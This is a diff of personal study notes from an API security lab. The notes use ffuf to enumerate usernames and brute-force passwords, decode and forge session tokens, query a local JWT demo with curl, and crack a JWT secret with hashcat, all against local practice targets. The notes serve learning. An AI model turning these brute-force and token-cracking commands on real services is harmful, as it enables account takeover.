@@ -277,6 +277,82 @@ sudo apt install git
 
 
 
-TODO TODO Find other user
+> [!todo] 
+> Find other user :
+> `ffuf -request Desktop/req.txt -request-proto http -mr "Invalid password" -w /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt`
+> ![[Pasted image 20230521131837.png]]
+> `ffuf -request Desktop/req.txt -request-proto http -mc 200 -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt`
+> ![[Pasted image 20230521132229.png]]
 
-└─$ ffuf -w /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -X POST -d "{\"email\":\"FUZZ\",\"password\":\"d\"}" -H "Content-Type: application/x-www-form-urlencoded" -u http://localhost:9000/v1/verify.php -mr "Invalid password"
+
+### Attacking Tokens
+
+> [!todo] 
+>  Unzip api-token-analysis
+>  `sudo docker-compose build`
+>  `sudo docker-compose up`
+
+> [!todo] 
+> Login witht admin / ramirez 
+> ![[Pasted image 20230521133132.png]]
+> console `document.cookie`
+
+> [!todo] 
+> Analyse token randomness quality:
+> 
+> ![[Pasted image 20230521133600.png]] 
+
+> [!todo] 
+> Token Decode:
+> `echo -n 'YWRtaW4tMTE6Mjk6NTEtZ3pr' | base64 -d` 
+> 
+> ![[Pasted image 20230521133823.png]]
+
+
+> [!todo] 
+>  Token Analysis
+>  ![[Pasted image 20230521134132.png]]
+>  `head -n 100 tokens.txt`
+>  ![[Pasted image 20230521134939.png]]
+>  ![[Pasted image 20230521135104.png]]
+
+
+> [!todo] 
+> TODO, create Token for jeremy:
+>  ![[Pasted image 20230521140128.png]]
+>  ![[Pasted image 20230521140157.png]]
+
+
+### JSON Web Tokens - Part 1: Theory
+
+> [!todo] 
+> Unzip jwt-demo.zip
+>  ``node server.js``
+
+![[Pasted image 20230521140549.png]]
+
+> [!tip] 
+> Online Tool: https://jwt.io/
+> 
+
+> [!todo] 
+> Run:
+> `curl -X POST http://localhost/login --header "Content-Type: application/json" --data '{"username": "user", "password": "user"}'` 
+> 
+> ![[Pasted image 20230521141048.png]]
+> `curl -i localhost/dashboard --Header 'Authorization: BEARER TOKEN'`
+> ![[Pasted image 20230521142429.png]]
+> ![[Pasted image 20230521142638.png]]
+> ![[Pasted image 20230521142730.png]]
+> Is not working because we don't have secret
+> ![[Pasted image 20230521142835.png]]
+> ![[Pasted image 20230521143739.png]]
+
+
+### JSON Web Tokens - Part 2: Attacking JWTs
+
+> [!todo] 
+>` hashcat.exe -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNjg0NjcyNzg1fQ.QU20lCyIQeJ_P6QcfOyeZeVXv-DkiKLEBGn1Skv52SI rockyou.txt`
+> 
+> ![[Pasted image 20230521144304.png]]
+
